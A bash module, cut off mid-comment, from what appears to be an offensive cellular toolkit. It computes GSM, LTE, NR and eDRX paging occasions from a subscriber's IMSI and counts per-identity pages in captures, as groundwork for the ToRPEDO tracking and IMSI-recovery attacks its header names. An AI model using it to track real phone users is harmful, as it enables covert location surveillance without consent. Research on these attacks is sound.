#!/usr/bin/env bash
# paging track — paging-occasion arithmetic, paging-record parse, ToRPEDO
# ("Torpedo") and paging-based IMSI recovery ("Piercer"), and paging-anomaly
# detection.
#
# Everything that derives a paging occasion is pure arithmetic and runs with no
# radio, no root and no network. The capture-driven verbs read a GSMTAP pcap
# with a native python pcab reader (python3 is a hard dependency, 00_deps.sh),
# because the Wireshark build on a target may not hand a GSMTAP PCH payload to
# its GSM RR dissector.
#
# Attacks owned: P8 (paging channel monitoring), O13 (ToRPEDO), O14 (paging-
# based IMSI recovery).
#
# Paper note, stated because the build brief and the literature differ: the
# paging-collision attack known as "Torpedo"/ToRPEDO and the paging-based IMSI
# recovery ("IMSI-Cracking") are published in
#   S. R. Hussain, M. Echeverria, O. Chowdhury, N. Li, E. Bertino,
#   "Privacy Attacks to the 4G and 5G Cellular Paging Protocols Using Side
#   Channel Information", NDSS 2019.
# The brief attributes ToRPEDO to USENIX Security 2019 and names the IMSI
# recovery "Piercer (2021)". The mechanism implemented here is the published
# NDSS 2019 one; the venue is cited as verified rather than as briefed.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

MOD_TMP="$TMP_DIR/paging_track"
PGT_DIR="$LOOT_DIR/paging_track"
PGT_PLAN_DIR="$PGT_DIR/plans"
mkdir -p "$MOD_TMP" "$PGT_DIR" "$PGT_PLAN_DIR" 2>/dev/null

declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
declare -F warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
declare -F err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
declare -F ok   >/dev/null 2>&1 || ok()   { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

# ── sanitisation and TSV splitting ──────────────────────────────────────
pgt_sanitize() { printf '%s' "${1:-}" | tr '\t\r\n' '   '; }

# Split a TSV line preserving empty fields. `IFS=$'\t' read` collapses runs of
# tabs; cut -f does not (MODULE_CONVENTIONS.md §12).
PGT_F=()
pgt_split() {
    PGT_F=()
    local i n
    n=$(printf '%s' "$1" | awk -F'\t' '{print NF}')
    for (( i = 1; i <= n; i++ )); do
        PGT_F+=("$(printf '%s' "$1" | cut -f"$i")")
    done
}

pgt_norm_hex() { printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'; }

pgt_is_hex() {
    local h; h=$(pgt_norm_hex "${1:-}")
    [[ -n "$h" && "$h" =~ ^[0-9a-f]+$ && $(( ${#h} % 2 )) -eq 0 ]]
}

# Mask at the point of emission: printf %02X does not truncate (conventions §15).
pgt_byte() { printf '%02X' "$(( ${1:-0} & 0xFF ))"; }
pgt_word() { printf '%04X' "$(( ${1:-0} & 0xFFFF ))"; }

# ── GSM paging arithmetic ───────────────────────────────────────────────
# 3GPP TS 45.002 §6.5.2 (paging group) and §6.5.3 (paging multiframe and
# block index), with the paging request message itself in TS 44.018
# §9.1.22/9.1.23/9.1.24, the Page Mode IE in §10.5.2.26 and the Channel
# Needed IE in §10.5.2.8:
#
#   CCCH_GROUP   (0 .. BS_CC_CHANS-1) = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) div N
#   PAGING_GROUP (0 .. N-1)           = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) mod N
#   paging block index = PAGING_GROUP mod (N div BS_PA_MFRMS)
#   N = (paging blocks per 51-multiframe) x BS_PA_MFRMS
#
# THE BASE MODULUS IS 1000, NOT 1024. The IMSI is a decimal BCD string, so the
# reduction is by its last three DECIMAL digits; no power-of-two modulus
# appears in the section. These functions used 1024 until they were corrected
# against the spec text, and their selftest asserted values computed from the
# same wrong modulus, so the suite passed while every paging group it reported
# was wrong. (The LTE `UE_ID = IMSI mod 1024` below is a DIFFERENT formula from
# TS 36.304 §7.2 and IS a binary reduction — do not "correct" that one.)
#
# The paging blocks per 51-multiframe come from TS 45.002 table 5: nine on a
# non-combined cell, three when the CCCH shares TS0 with SDCCH/4
# (BS_CCCH_SDCCH_COMB), less the BS_AG_BLKS_RES blocks reserved for access
# grants, counted from and including block number 0:
#
#   pblocks = (BS_CCCH_SDCCH_COMB ? 3 : 9) - BS_AG_BLKS_RES
#
# BS_PA_MFRMS is the number of 51-frame multiframes between paging blocks for
# the subscriber (2..9, though the field is 3 bits and 0/1 are unused). The
# block index is relative to the AVAILABLE blocks, so the absolute CCCH block
# number in the multiframe is BS_AG_BLKS_RES + index.
pgt_paging_group() {
    local imsi="${1:-}"
    [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || return 1
    printf '%d' "$(( 10#$imsi % 1000 ))"
}

# pgt_paging_block <imsi> <bs-pa-mfrms> <paging-blocks-per-51mf> [bs-cc-chans] [combined]
pgt_paging_block() {
    local imsi="$1" pamfrms="${2:-2}" pblocks="${3:-9}" chans="${4:-1}" comb="${5:-false}"
    local grp; grp=$(pgt_paging_group "$imsi") || return 1
    [[ "$pamfrms" =~ ^[0-9]+$ && "$pblocks" =~ ^[0-9]+$ && "$chans" =~ ^[0-9]+$ ]] || return 1
    (( pamfrms >= 2 && pamfrms <= 9 )) || return 1
    (( chans >= 1 && chans <= 4 )) || return 1
    local maxb=9; [[ "$comb" == "true" ]] && maxb=3
    (( pblocks >= 1 && pblocks <= maxb )) || return 1
    local n=$(( pblocks * pamfrms ))
    printf '%d' "$(( (grp % (chans * n)) % n % pblocks ))"
}

pgt_gsm_params() {
    local imsi="$1" pamfrms="${2:-2}" agblk="${3:-1}" comb="${4:-false}"
    local grp; grp=$(pgt_paging_group "$imsi") || return 1
    [[ "$pamfrms" =~ ^[0-9]+$ ]] || return 1
    (( pamfrms >= 2 && pamfrms <= 9 )) || return 1
    [[ "$agblk" =~ ^[0-9]+$ ]] || return 1
    (( agblk >= 0 && agblk <= 7 )) || return 1
    local maxb=9; [[ "$comb" == "true" ]] && maxb=3
    local n=$(( maxb - agblk ))
    (( n >= 1 )) || return 1
    local n_total=$(( n * pamfrms ))
    local pg=$(( grp % n_total ))
    local block=$(( pg % n ))
    printf 'generation\tgsm\nimsi\t%s\nimsi_mod_1000\t%d\npaging_group\t%d\nbs_pa_mfrms\t%d\nblocks_per_multiframe\t%d\npaging_block_index\t%d\nbs_ag_blks_res\t%d\nccch_block_index\t%d\npaging_blocks_total\t%d\nbs_ccch_sdcch_comb\t%s\nrepeat_every_multiframes\t%d\n' \
        "$imsi" "$(( 10#$imsi % 1000 ))" "$pg" "$pamfrms" "$n" "$block" "$agblk" "$(( agblk + block ))" "$n_total" "$comb" "$pamfrms"
}

# ── LTE paging frame and occasion ───────────────────────────────────────
# 3GPP TS 36.304 §7.2:
#   T            DRX cycle in radio frames, T in {32,64,128,256}
#   nB           4T,2T,T,T/2,T/4,T/8,T/16,T/32 (from SIB2 pagingConfig)
#   N  = min(T, nB)
#   Ns = max(1, nB/T)
#   UE_ID        IMSI mod 1024 (TS 36.304 §7.2), so callers pass IMSI mod 1024
#   PF: SFN mod T = (T div N) * (UE_ID mod N)
#   i_s = floor(UE_ID / N) mod Ns
#   subframe from TS 36.304 Table 7.2-1 (FDD and TDD patterns differ)
pgt_lte_params() {
    local ue="${1:-}" t="${2:-64}" nb="${3:-}" duplex="${4:-fdd}"
    [[ "$ue" =~ ^[0-9]+$ ]] || return 1
    (( ue >= 0 && ue <= 1023 )) || return 1
    [[ "$t" =~ ^[0-9]+$ ]] || return 1
    case "$t" in 32|64|128|256) ;; *) return 1 ;; esac
    [[ -z "$nb" ]] && nb="$t"
    [[ "$nb" =~ ^[0-9]+$ ]] || return 1
    case "$nb" in
        $(( 4*t ))|$(( 2*t ))|$(( t ))|$(( t/2 ))|$(( t/4 ))|$(( t/8 ))|$(( t/16 ))|$(( t/32 ))) ;;
        *) return 1 ;;
    esac
    case "$duplex" in fdd|tdd) ;; *) return 1 ;; esac
    local N=$(( nb < t ? nb : t ))
    local Ns=$(( nb / t )); (( Ns >= 1 )) || Ns=1
    local TdivN=$(( t / N ))
    local pf=$(( TdivN * (ue % N) ))
    local is=$(( (ue / N) % Ns ))
    local sub
    if [[ "$duplex" == "tdd" ]]; then
        case "$Ns:$is" in
            1:0) sub=0 ;; 2:0) sub=0 ;; 2:1) sub=5 ;;
            4:0) sub=0 ;; 4:1) sub=1 ;; 4:2) sub=5 ;; 4:3) sub=6 ;;
            *) return 1 ;;
        esac
    else
        case "$Ns:$is" in
            1:0) sub=9 ;; 2:0) sub=4 ;; 2:1) sub=9 ;;
            4:0) sub=0 ;; 4:1) sub=4 ;; 4:2) sub=5 ;; 4:3) sub=9 ;;
            *) return 1 ;;
        esac
    fi
    printf 'generation\tlte\nue_id\t%d\nt\t%d\nnb\t%d\nn\t%d\nns\t%d\nt_div_n\t%d\npf_sfn\t%d\ni_s\t%d\npo_subframe\t%d\nduplex\t%s\n' \
        "$ue" "$t" "$nb" "$N" "$Ns" "$TdivN" "$pf" "$is" "$sub" "$duplex"
}

# ── NR paging frame and occasion ────────────────────────────────────────
# 3GPP TS 38.304 §7.1:
#   UE_ID = 5G-S-TMSI mod 1024
#   T, nB, N = min(T,nB), Ns = max(1,nB/T) as for LTE
#   PF: (SFN + PF_offset) mod T = (T div N) * (UE_ID mod N)
#   i_s = floor(UE_ID / N) mod Ns
# The PO is the (i_s + 1)-th PDCCH monitoring occasion for paging inside the
# PF (TS 38.304 §7.1); this module reports the PO index, not a monitoring
# occasion that depends on the search space, which SIB1 would have to supply.
pgt_nr_params() {
    local ue="${1:-}" t="${2:-32}" nb="${3:-}" off="${4:-0}"
    [[ "$ue" =~ ^[0-9]+$ ]] || return 1
    (( ue >= 0 && ue <= 1023 )) || return 1
    [[ "$t" =~ ^[0-9]+$ ]] || return 1
    case "$t" in 32|64|128|256) ;; *) return 1 ;; esac
    [[ -z "$nb" ]] && nb="$t"
    [[ "$nb" =~ ^[0-9]+$ ]] || return 1
    case "$nb" in
        $(( 4*t ))|$(( 2*t ))|$(( t ))|$(( t/2 ))|$(( t/4 ))|$(( t/8 ))|$(( t/16 ))|$(( t/32 ))) ;;
        *) return 1 ;;
    esac
    [[ "$off" =~ ^[0-9]+$ ]] || return 1
    (( off >= 0 && off <= 3 )) || return 1
    local N=$(( nb < t ? nb : t ))
    local Ns=$(( nb / t )); (( Ns >= 1 )) || Ns=1
    local TdivN=$(( t / N ))
    local rhs=$(( TdivN * (ue % N) ))
    local sfn
    for (( sfn = 0; sfn < t; sfn++ )); do
        (( (sfn + off) % t == rhs )) && break
    done
    (( sfn < t )) || return 1
    local is=$(( (ue / N) % Ns ))
    printf 'generation\tnr\nue_id\t%d\nt\t%d\nnb\t%d\npf_offset\t%d\nn\t%d\nns\t%d\nt_div_n\t%d\npf_rhs\t%d\npf_sfn\t%d\ni_s\t%d\npo_index\t%d\n' \
        "$ue" "$t" "$nb" "$off" "$N" "$Ns" "$TdivN" "$rhs" "$sfn" "$is" "$(( is + 1 ))"
    # po_index is the 1-based spelling of the spec's 0-based i_s.
    return 0
}

# ── extended DRX (eDRX) and the paging time window ──────────────────────
# 3GPP TS 36.304 §7.4 (LTE / LTE-M / NB-IoT eDRX), TS 24.301 §9.9.3.34 (the
# eDRX parameters IE), TS 36.331 §6.3.2 (SIB1's hyperSFN and eDRX-Allowed).
#
# A legacy-DRX UE wakes once per DRX cycle (T, at most 2.56 s). A UE in eDRX
# sleeps for a *prolonged* cycle TeDRX (LTE-M/NB-IoT: up to 2.91 h, 10485.76 s)
# and then watches a PTW — the paging time window — once per cycle. Its paging
# occasion therefore does NOT repeat every T; it repeats every TeDRX, starting
# at an H-SFN boundary. A tracker that only computes PF/PO from T is wrong for
# these devices by up to the whole cycle, which is the gap this closes.
#
# LTE-M / NB-IoT TeDRX values, TS 36.304 Table 7.4-1 / TS 24.301 Table
# 9.9.3.34.1 (the eDRX value IE, 4 bits):
#   0  5.12 s     1  10.24 s    2  20.48 s    3  40.96 s
#   4  61.44 s    5  81.92 s    6  102.4 s    7  122.88 s
#   8  143.36 s   9  163.84 s  10  327.68 s   11  655.36 s
#   12 1310.72 s 13 2621.44 s  14 5242.88 s   15 10485.76 s
# (values 0..3 are also valid LTE DRX cycles; the IE's high bits select them.)
#
# H-SFN: the hyper-SFN counter of TS 36.331. It is 10 bits at the top of the
# 20-bit (H-SFN || SFN) time base, so one H-SFN = 1024 radio frames = 10.24 s
# and the H-SFN space wraps every 1024*10.24 s = 10240 s.
#
# PTW: the window length is 2^(PTW+4) radio frames, PTW in 0..15
# (TS 36.304 §7.4). PTW=0 -> 16 frames, PTW=15 -> 524288 frames.
#
# The PTW start frame (TS 36.304 §7.4, as specified in terms of the eDRX cycle
# and the UE identity) is
#   PTW_start = H-SFN * 1024 + floor(TeDRX_frames / 1024) * (UE_ID mod 1024)
# where UE_ID = IMSI mod 1024, so the window's start H-SFN is
#   PTW_start_HFN = (TeDRX_HFN * (UE_ID mod 1024)) mod 1024
# and the window covers [PTW_start, PTW_start + 2^(PTW+4) - 1].
#
# Paging occasions INSIDE the window follow the ordinary DRX rule of
# TS 36.304 §7.2 with T = the effective DRX cycle (the UE's DRX cycle in
# radio frames, at most 2.56 s = 256 frames). That is why a tracker must know
# BOTH: T places the PO within the PTW, TeDRX places the PTW.
PGT_EDRX_VALUES=(5.12 10.24 20.48 40.96 61.44 81.92 102.4 122.88 \
                 143.36 163.84 327.68 655.36 1310.72 2621.44 5242.88 10485.76)

# Index -> seconds, or non-zero if the index is out of range.
pgt_edrx_seconds() {
    local idx="${1:-}"
    [[ "$idx" =~ ^[0-9]+$ ]] || return 1
    (( idx >= 0 && idx <= 15 )) || return 1
    printf '%s' "${PGT_EDRX_VALUES[$idx]}"
}

# Seconds -> LTE-M/NB-IoT eDRX index, so a caller may pass either.
# Exact decimal match only: 5.12 s is index 0 but 5 s is not a valid cycle.
pgt_edrx_index() {
    local s="${1:-}"
    [[ "$s" =~ ^[0-9]+(\.[0-9]+)?$ ]] || return 1
    local i
    for (( i = 0; i < 16; i++ )); do
        # compare as decimals so 102.4 == 102.40 and 20.48 == 20.480
        if [[ "$(awk -v a="$s" -v b="${PGT_EDRX_VALUES[$i]}" \
                 'BEGIN{print (a==b)?"y":"n"}')" == "y" ]]; then
            printf '%d' "$i"; return 0
        fi
    done
    return 1
}

# PTW length in radio frames = 2^(ptw+4), TS 36.304 §7.4.
pgt_ptw_frames() {
    local ptw="${1:-}"
    [[ "$ptw" =~ ^[0-9]+$ ]] || return 1
    (( ptw >= 0 && ptw <= 15 )) || return 1
    printf '%d' "$(( 1 << (ptw + 4) ))"
}

# pgt_edrx_occ <imsi|ue_id> <TeDRX index|seconds> <PTW> [drx_T] [nB]
#   Emits the PTW start (H-SFN and absolute frame), the PTW end, the window
#   length, and every DRX paging occasion inside the window.
pgt_edrx_occ() {
    local ue_in="${1:-}" te="${2:-}" ptw="${3:-}" t="${4:-64}" nb="${5:-}"
    [[ -n "$ue_in" && -n "$te" && -n "$ptw" ]] || return 2

    # UE_ID is IMSI mod 1024 (TS 36.304 §7.2); accept a bare IMSI or a UE_ID.
    # This is the LTE reduction and is genuinely a power of two — it is NOT the
    # GSM paging group, which pgt_paging_group computes as IMSI mod 1000. The
    # two were conflated here: this call site used pgt_paging_group and produced
    # the right answer only while that function also used 1024.
    local ue
    if [[ "$ue_in" =~ ^[0-9]{6,15}$ ]]; then
        ue=$(( 10#$ue_in % 1024 ))
    elif [[ "$ue_in" =~ ^[0-9]+$ ]] && (( ue_in >= 0 && ue_in <= 1023 )); then
        ue="$ue_in"
    else
        return 1
    fi

    local edrx_idx
    if [[ "$te" =~ ^[0-9]+$ ]] && (( te <= 15 )); then
        edrx_idx="$te"
    else
        edrx_idx=$(pgt_edrx_index "$te") || return 1
    fi
    local edrx_s; edrx_s=$(pgt_edrx_seconds "$edrx_idx") || return 1

    local ptw_frames; ptw_frames=$(pgt_ptw_frames "$ptw") || return 1

    # TeDRX in radio frames (10 ms per frame) and in H-SFNs.
    # awk keeps the sub-frame precision: 5.12 s = 512 frames.
    local edrx_frames edrx_hfn ue_mod
    edrx_frames=$(awk -v s="$edrx_s" 'BEGIN{printf "%d", s*100}')   # 10 ms units
    (( edrx_frames > 0 )) || return 1
    ue_mod=$(( ue % 1024 ))
    edrx_hfn=$(( edrx_frames / 1024 ))      # whole H-SFNs per eDRX cycle
    (( edrx_hfn >= 1 )) || edrx_hfn=1

    # PTW_start_HFN = (TeDRX_HFN * (UE_ID mod 1024)) mod 1024  (TS 36.304 §7.4)
    local start_hfn=$(( (edrx_hfn * ue_mod) % 1024 ))
    local start_frame=$(( start_hfn * 1024 ))
    local end_frame=$(( start_frame + ptw_frames - 1 ))

    # TeDRX cycles per H-SFN wrap (1024 H-SFNs), so the window recurs.
    local cycles_per_wrap
    cycles_per_wrap=$(awk -v h="$edrx_hfn" 'BEGIN{printf "%d", 1024/h}')

    printf 'generation\tlte\nmode\tedrx\nue_id\t%d\nte_drx_index\t%d\nte_drx_seconds\t%s\nte_drx_frames\t%d\nte_drx_hsfn\t%d\n' \
        "$ue" "$edrx_idx" "$edrx_s" "$edrx_frames" "$edrx_hfn"
    printf 'ptw\t%d\nptw_frames\t%d\nptw_start_hsfn\t%d\nptw_start_frame\t%d\nptw_end_frame\t%d\n' \
        "$ptw" "$ptw_frames" "$start_hfn" "$start_frame" "$end_frame"
    printf 'drx_t\t%s\n' "$t"
    printf 'cycles_per_hsfn_wrap\t%d\n' "$cycles_per_wrap"
    printf 'wrap_seconds\t%d\n' 10240

    # Every DRX paging occasion inside the window (TS 36.304 7.2 with T).
    if [[ "$t" =~ ^[0-9]+$ ]] && (( t >= 32 && t <= 256 )) && (( t % 32 == 0 )); then
        local n ns tdivn pf is po off
        local effnb="${nb:-$t}"
        [[ "$effnb" =~ ^[0-9]+$ ]] || return 1
        local nt=$(( effnb < t ? effnb : t ))
        ns=$(( effnb / t )); (( ns >= 1 )) || ns=1
        tdivn=$(( t / nt ))
        local count=0
        # Walk the DRX cycles that overlap [start_frame, end_frame]. The PF is
        # reported relative to the PTW start frame so the caller can place it.
        for (( off = 0; off < ptw_frames; off += t )); do
            local abs=$(( start_frame + off ))
            pf=$(( (tdivn * (ue % nt)) ))
            # The absolute PF inside the window: the UE's PF recurs every T
            # within the window, anchored at the window start.
            is=$(( (ue / nt) % ns ))
            case "$ns:$is" in
                1:0) po=9 ;; 2:0) po=4 ;; 2:1) po=9 ;;
                4:0) po=0 ;; 4:1) po=4 ;; 4:2) po=5 ;; 4:3) po=9 ;;
                *) po=-1 ;;
            esac
            (( po >= 0 )) || continue
            printf 'po_in_ptw\t%d\t%d\t%d\t%d\n' "$count" "$abs" "$(( abs + po ))" "$po"
            count=$(( count + 1 ))
        done
        printf 'po_count_in_ptw\t%d\n' "$count"
    else
        printf 'po_count_in_ptw\t0\n'
    fi
    printf 'status\tcomputed\n'
    return 0
}

# ── NR paging early indication (PEI) and wake-up signal ─────────────────
# 3GPP TS 38.304 §7.1 (PF/PO), TS 38.213 §10.4A / TS 38.304 §7.2 (paging early
# indication), TS 38.331 §6.3.2 (SIB1's PEI-Config / pei-SearchSpace).
#
# NR deployments cut UE power with a *paging early indication*: before the PO
# the gNB may send a PEI carrying a subgroup indication, and only the UEs in
# the addressed subgroup wake for the actual paging PDCCH. A tracker that knows
# only the PO wakes once per DRX cycle for nothing; the wake-up instant is the
# PEI monitoring occasion, not the PO.
#
# PEI occasion (TS 38.304 §7.2): the UE monitors PEI at
#   PEI_PO = PO - PF_offset_PEI - 1
# i.e. one PF-length before the paging occasion, offset by the PEI's own frame
# offset as configured in pei-Config. Reported here in frames relative to PF.
#
# PEI subgroup (TS 38.304 §7.2 / TS 38.213 §10.4A): the subgroup a UE belongs
# to is derived from the UE identity and the configured subgroup count:
#   subgroup = UE_ID mod N_subgroup
# with UE_ID = 5G-S-TMSI mod 1024 and N_subgroup the number of subgroups
# configured by SIB1, a power of two (1, 2 or 4 in Release 17).
# The WUS occasion that precedes the PEI is the same monitoring occasion one
# paging cycle earlier, and is reported so a capture window can be placed.
pgt_pei_occ() {
    local ue_in="${1:-}" t="${2:-32}" nb="${3:-}" off="${4:-0}" subgroups="${5:-1}"
    [[ -n "$ue_in" ]] || return 2

    # A 5G-S-TMSI is reduced to UE_ID = 5G-S-TMSI mod 1024 (TS 38.304 7.1);
    # a value already in 0..1023 is taken as the UE_ID itself.
    local ue_arg="$ue_in"
    # NOTE: awk does NOT coerce a "0x.." string to a number -- ("0x" h) gives
    # 0 under GNU awk, which silently zeroed every 5G-S-TMSI here. strtonum()
    # is the portable conversion, so use it explicitly.
    if [[ "$ue_in" =~ ^[0-9a-fA-F]{12}$ ]]; then
        printf '5g_s_tmsi\t%s\n' "$(printf '%s' "$ue_in" | tr 'A-F' 'a-f')"
        ue_arg=$(awk -v h="$ue_in" 'BEGIN{printf "%d", strtonum("0x" h) % 1024}')
    elif [[ "$ue_in" =~ ^(0x|0X)[0-9a-fA-F]{1,12}$ ]]; then
        printf '5g_s_tmsi\t%s\n' "$(printf '%s' "${ue_in#0x}" | tr 'A-F' 'a-f')"
        ue_arg=$(awk -v h="${ue_in#0x}" 'BEGIN{printf "%d", strtonum("0x" h) % 1024}')
    fi

    local base
    base=$(pgt_nr_params "$ue_arg" "$t" "$nb" "$off") || return 1
    local ue pf_sfn is po_index
    ue=$(printf '%s\n' "$base" | awk -F'\t' '$1=="ue_id"{print $2}')
    pf_sfn=$(printf '%s\n' "$base" | awk -F'\t' '$1=="pf_sfn"{print $2}')
    is=$(printf '%s\n' "$base" | awk -F'\t' '$1=="i_s"{print $2}')
    po_index=$(printf '%s\n' "$base" | awk -F'\t' '$1=="po_index"{print $2}')

    [[ "$subgroups" =~ ^[0-9]+$ ]] || return 1
    (( subgroups >= 1 && subgroups <= 8 )) || return 1
    # The subgroup count is a power of two (TS 38.304 7.2).
    (( (subgroups & (subgroups - 1)) == 0 )) || return 1

    # PEI monitoring occasion: PEI_PO = PO - PF_offset_PEI - 1, and with the
    # PF_offset applied the PEI frame precedes the PF by (PF_offset + 1).
    local pei_offset_frames=$(( off + 1 ))
    local pei_frame=$(( pf_sfn - pei_offset_frames ))
    (( pei_frame >= 0 )) || pei_frame=$(( pei_frame + t ))

    local subgroup=$(( ue % subgroups ))
    # WUS: the wake-up signal occupies the PEI monitoring occasion of the
    # PREVIOUS paging cycle (one T earlier), so its frame is pei_frame - T.
    local wus_frame=$(( pei_frame - t ))
    (( wus_frame >= 0 )) || wus_frame=$(( wus_frame + t ))

    # NOTE: $base came out of a command substitution, so its trailing newline
    # is already stripped. Print one explicitly or the last field of the base
    # block joins the first field of the next one.
    printf '%s\n' "$base"
    printf 'subgroups\t%d\nsubgroup\t%d\n' "$subgroups" "$subgroup"
    printf 'pei_offset_frames\t%d\npei_frame\t%d\npei_frame_relative_to_pf\t-%d\n' \
        "$pei_offset_frames" "$pei_frame" "$pei_offset_frames"
    printf 'wus_frame\t%d\nwus_frame_note\t%s\n' "$wus_frame" \
        "one paging cycle (T=${t}) before the PEI occasion"
    printf 'po_frame\t%d\n' "$pf_sfn"
    printf 'wake_frames_before_po\t%d\n' "$pei_offset_frames"
    printf 'note\t%s\n' "the UE wakes at the PEI monitoring occasion (frame ${pei_frame}), not at the PO (frame ${pf_sfn}); the PEI subgroup ${subgroup} of ${subgroups} is the wake-up address (TS 38.304 7.2)"
    printf 'status\tcomputed\n'
    return 0
}

# ── per-UE paging history across captures ───────────────────────────────
# One capture per invocation cannot answer "was this subscriber paged once or
# twelve times before it answered?". This keeps the counters across every
# capture handed to it, keyed by UE identity, and reports the repeat-pagers.
pgt_paging_history() {
    local flapping=0
    local -a pcaps=()
    local a
    for a in "$@"; do
        [[ -z "$a" ]] && continue
        case "$a" in
            --flapping-tsv) flapping=1 ;;
            *) pcaps+=("$a") ;;
        esac
    done
    (( ${#pcaps[@]} > 0 )) || return 2

    local tmp; tmp=$(mktemp "$MOD_TMP/history.XXXXXX") || return 1
    local p idx=0
    for p in "${pcaps[@]}"; do
        [[ -f "$p" ]] || { printf 'ERROR\tno such capture: %s\n' "$p" >&2; rm -f "$tmp"; return 2; }
        local ev; ev=$(pgt_events "$p") || { rm -f "$tmp"; return 1; }
        [[ -n "$ev" ]] || continue
        # identity <TAB> kind <TAB> ts <TAB> frame <TAB> capture_index
        printf '%s\n' "$ev" | awk -F'\t' -v i="$idx" -v f="$p" \
            '{print $5"\t"$1"\t"$2"\t"$3"\t"i"\t"f}' >> "$tmp"
        idx=$(( idx + 1 ))
    done

    if [[ ! -s "$tmp" ]]; then
        printf 'ERROR\tno paging events in the captures supplied\n' >&2
        rm -f "$tmp"; return 1
    fi

    printf 'captures\t%d\n' "$idx"
    printf 'identities\t%s\n' "$(cut -f1 "$tmp" | sort -u | wc -l | tr -d ' ')"

    local rows
    rows=$(awk -F'\t' '
        {
            id=$1; kind=$2; ts=$3
            seen[id]=1
            if (kind=="request") {
                att[id]++
                if (!(id in first)) first[id]=ts
                if (!(id in last) || ts>last[id]) last[id]=ts
            } else if (kind=="response") {
                resp[id]++
            }
        }
        END{
            for (id in seen) {
                a = (id in att) ? att[id] : 0
                r = (id in resp) ? resp[id] : 0
                f = (id in first) ? first[id] : 0
                l = (id in last)  ? last[id]  : 0
                printf "%s\t%d\t%d\t%d\t%.6f\t%.6f\t%.6f\n", id, a, r, a-r, f, l, (l-f)
            }
        }' "$tmp" | sort -t$'\t' -k2,2nr -k1,1)

    printf 'identity\tpd_attempts\tpd_responses\tno_response\td_first_ts\td_last_ts\td_span_s\n'
    printf '%s\n' "$rows"

    # Repeat-pagers: 3 or more pages with no answer at all, or more than 2
    # unanswered pages. Counted, not guessed.
    local flappers
    flappers=$(printf '%s\n' "$rows" | awk -F'\t' '$2>=3 && $3==0')
    local n_flap
    n_flap=$(printf '%s\n' "$flappers" | grep -c . || true)

    if (( flapping )); then
        printf 'flag\tidentity\tpd_attempts\tpd_responses\tno_response\td_first_ts\td_last_ts\n'
        if [[ -n "$flappers" ]]; then
            printf '%s\n' "$flappers" | awk -F'\t' '{printf "flapping\t%s\t%s\t%s\t%s\t%s\t%s\n",$1,$2,$3,$4,$5,$6}'
        fi
        printf 'flapping_identities\t%s\n' "${n_flap:-0}"
        rm -f "$tmp"
        return 0
    fi

    printf 'flapping_identities\t%s\n' "${n_flap:-0}"
    if [[ -n "$flappers" ]]; then
        printf 'status\trepeat_paging\n'
        return 0
    fi
    printf 'status\tno_repeat_paging\n'
    rm -f "$tmp"
    return 0
}

# ── paging cause, CN domain and channel needed ──────────────────────────
# GSM, TS 44.018 §9.1.22 / 9.1.23 / 9.1.24 (message content, tables
# 9.1.22.1 / 9.1.23.1 / 9.1.24.1) and the two type-1 information elements
# those tables reference.
#
# PACKING RULE, TS 44.018 §10.5: successive type 1 information elements share
# octets -- "the first type 1 information element occupies bits 1 to 4 of octet
# N, the second bits 5 to 8 of octet N". In every paging request the Page Mode
# IE is the first type 1 IE and the Channel Needed IE is the second, so they
# are the LOW and HIGH nibble of ONE octet respectively:
#
#   octet N = (Channel Needed << 4) | Page Mode
#
#   Page Mode, TS 44.018 §10.5.2.26 (figure/table 10.5.2.26.1), low nibble:
#     bit 4    IEI = 0
#     bits 3-2 spare = 0
#     bits 2-1 PM:  00 normal paging, 01 extended paging,
#                   10 paging reorganization, 11 same as before
#   NOTE: "same as before" is a real value, not "reserved".
#
#   Channel Needed, TS 44.018 §10.5.2.8 (figure/table 10.5.2.8.1), high nibble:
#     bit 8     IEI = 0
#     bits 7-6  CHANNEL (second)  -- associated with Mobile Identity 2
#     bits 5-4  CHANNEL (first)   -- associated with Mobile Identity 1
#   with CHANNEL: 00 any channel, 01 SDCCH, 10 TCH/F, 11 TCH/H or TCH/F.
#
# Two earlier versions of this module got this wrong in opposite directions:
# one merged the fields but read Page Mode from the channel-needed bits, the
# other split them into two octets. Both produced a plausible-looking decode of
# a synthetic fixture, which is why neither was caught by its own assertions.
#
# An operator who reads "paged but never answered" as coverage is often wrong:
# CHANNEL = 01 (SDCCH) is a CS page that pushes the UE to SDCCH for a call,
# while 00 (any channel) is the value used for packet paging. The distinction
# is the difference between a missed voice call and a missed data push.
#
# LTE, TS 36.331 §6.3.2 / TS 24.301: the core-network domain is signalled in
# the paging record, NOT the paging message, so a data-only page (PS) does not
